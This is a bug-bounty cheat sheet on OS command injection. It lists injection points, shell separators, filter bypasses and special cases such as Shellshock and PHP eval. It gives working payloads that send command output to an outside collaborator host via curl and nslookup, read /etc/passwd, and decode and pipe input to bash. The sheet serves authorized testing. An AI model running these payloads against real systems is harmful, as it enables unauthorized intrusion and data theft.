# OS Command Injection

**TL;DR**: your input is concatenated into a server-side shell command. Confirm via timing/OOB (often blind), then prove with `id`/`whoami` to a collaborator. Non-destructive: never rm/reboot/fork bomb.

## Where to look
- Features that call a binary: ping/traceroute/nslookup, file conversion (ImageMagick, ffmpeg, LibreOffice, pandoc, wkhtmltopdf, ghostscript), PDF/thumbnail generation, backup/export, git operations, archive (zip/tar), mail sending (sendmail), DNS/whois lookup, antivirus scan.
- Suspect params: `cmd`, `exec`, `host`, `ip`, `domain`, `file`, `name`, `path`, `url`, `option`, `arg`.
- Indirect injection: upload filename used in a command, EXIF metadata, field passed to a command template.

## Shell separators / operators
- `;` `&&` `||` `|` `&` `\n` (`%0a`) `\r` (`%0d`).
- Substitution: `` `cmd` ``, `$(cmd)`, `${cmd}`.
- Quoted context: close `'` or `"` first (`'; id;'`, `"; id;"`).
- Windows: `&`, `&&`, `|`, `||`, `%0a`, `^` (escape).

## Detection
- **Time-based (blind, most reliable)**: `; sleep 5`, `& ping -c 5 127.0.0.1`, `|| sleep 5`, Windows `& timeout 5` / `ping -n 5 127.0.0.1`. Measure the delta.
- **OOB**: `; nslookup $(whoami).collab.oast.fun`, `; curl http://collab/$(id|base64 -w0)`, Windows `& nslookup %USERNAME%.collab`. Exfil into the DNS subdomain.
- **Direct output** (rare): `; id`, see output in the response.

## Filter bypass
- Whitespace filtered: `${IFS}`, `{cat,/etc/passwd}`, `cat</etc/passwd`, `%09` (tab), `$IFS$9`.
- Keyword filtered: empty quotes `w'h'oami`, `wh""oami`, `who$@ami`, concat `a=who;b=ami;$a$b`, backslash `who\ami`, wildcard `/???/??t /???/p??swd`.
- Base64: `echo <b64> | base64 -d | bash`.
- `/` blacklisted: `${PATH:0:1}` = `/`, `${HOME:0:1}`.
- Hex/octal via `$'\x..'`.
- Windows: inserted `^` (`who^ami`), variables `%COMSPEC%`.

## Escalation (after confirmation, with authorization)
- Reverse shell is often out-of-scope for non-destructive BB; prefer proving via `id`/`hostname`/reading a harmless file (`/etc/hostname`) to the collaborator.
- Chain toward file/cred access/internal pivot per program rules.

## Special cases
- **Shellshock** (CVE-2014-6271, old CGI/bash): inject via headers (User-Agent/Referer/Cookie) `() { :;}; <command>`, e.g. `() { :;}; /bin/bash -c "curl http://collab/$(id|base64 -w0)"`.
- **SSI injection** (.shtml / SSI-enabled): `<!--#exec cmd="/usr/bin/id"-->`.
- **PHP eval/assert contexts**: `${@print(system($_SERVER['HTTP_USER_AGENT']))}`, `{${phpinfo()}}`, `;phpinfo();//`.
- **Node.js code-injection sinks** (server-side JS): `eval()`, `Function()`, `setTimeout/setInterval(str)`, `child_process`, `unserialize()` (node-serialize). See `INSECURE_DESERIALIZATION.md` / `PROTOTYPE_POLLUTION.md`.
- **Argument injection** (not full command injection): inject flags into a binary (`--output`, `-o`, `--use-compress-program='sh -c ...'` for tar, git `--upload-pack`, curl `-o`/`@file`). Often overlooked and powerful.
- **ImageMagick** (MSL/`ephemeral:`, old "ImageTragick" CVE-2016-3714) via uploaded file.
- **ffmpeg** SSRF/LFI via HLS playlists.

## Caido
- Replay + Automate: sleep payloads, sort by the "time" column.
- OOB: DNS/HTTP payload to collaborator, watch the listener.

## References
- PortSwigger - OS command injection - https://portswigger.net/web-security/os-command-injection
- PayloadsAllTheThings - Command Injection - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- PayloadsAllTheThings - Argument Injection - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Argument%20Injection
- OWASP - Command Injection - https://owasp.org/www-community/attacks/Command_Injection
- OWASP WSTG - Testing for Command Injection - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
- HackTricks - Command Injection - https://book.hacktricks.wiki/en/pentesting-web/command-injection.html
- YesWeHack guide - OS command injection - https://www.yeswehack.com/learn-bug-bounty/ultimate-guide-os-command-injection
